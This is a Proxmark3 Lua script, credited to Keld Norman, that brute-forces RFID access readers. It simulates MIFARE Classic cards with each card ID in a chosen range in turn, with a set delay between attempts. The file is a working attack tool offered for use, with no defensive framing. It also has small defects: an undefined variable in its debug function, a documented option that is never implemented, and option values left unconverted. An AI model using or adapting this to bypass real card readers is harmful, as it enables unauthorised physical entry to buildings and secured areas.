-- Run me like this: proxmark3 /dev/rfcomm0 -l ./hf_bruteforce.lua

local getopt = require('getopt')

copyright = ''
author = 'Keld Norman'
version = 'v1.0.0'
desc = [[

]]
example = [[
    --  (the above example would bruteforce card number, starting at 1, ending at 10, and waiting 1 second between each card)

    script run hf_bruteforce -s 1 -e 10 -t 1000
]]
usage = [[

script run hf_bruteforce -s start_id -e end_id -t timeout -d direction

Arguments:
    -h       this help
    -s       0-0xFFFFFFFF         start id
    -e       0-0xFFFFFFFF         end id
    -t       0-99999, pause      timeout (ms) between cards (use the word 'pause' to wait for user input)
]]


local DEBUG = true

---
-- Debug print function
local function dbg(args)
    if not DEBUG then return end
    if type(args) == 'table' then
        local i = 1
        while result[i] do
            dbg(result[i])
            i = i+1
        end
    else
        print('###', args)
    end
end
---
-- When errors occur
local function oops(err)
    print('ERROR:', err)
    core.clearCommandBuffer()
    return nil, err
end
---
-- Usage help
local function help()
    print(copyright)
    print(author)
    print(version)
    print(desc)
    print('Example usage')
    print(example)
    print(usage)
end
---
-- Exit message
local function exitMsg(msg)
 print( string.rep('--',20) )
 print(msg)
 print( string.rep('--',20) )
 print()
end
---
-- Start
local function main(args)

    print( string.rep('--',20) )
    print( string.rep('--',20) )
    print()
    local timeout = 0
    local start_id = 0
    local end_id = 0xFFFFFFFF

    for o, a in getopt.getopt(args, 'e:s:t:h') do
        if o == 's' then start_id = a end
        if o == 'e' then end_id = a end
        if o == 't' then timeout = a end
        if o == 'h' then return print(usage) end
    end

    -- template
	local command = 'hf 14a sim t 1 u %08X'

	print(' Bruteforcing MFC card numbers from 00000000 to FFFFFFFF using delay: '..timeout)
    print('')
    print( string.rep('--',20) )

    for n = start_id, end_id do
        local c = string.format( command, n )
        print(' Running: "'..c..'"')
        core.console(c)
		core.console('msleep '..timeout);
        core.console('hw ping')
    end

end
main(args)

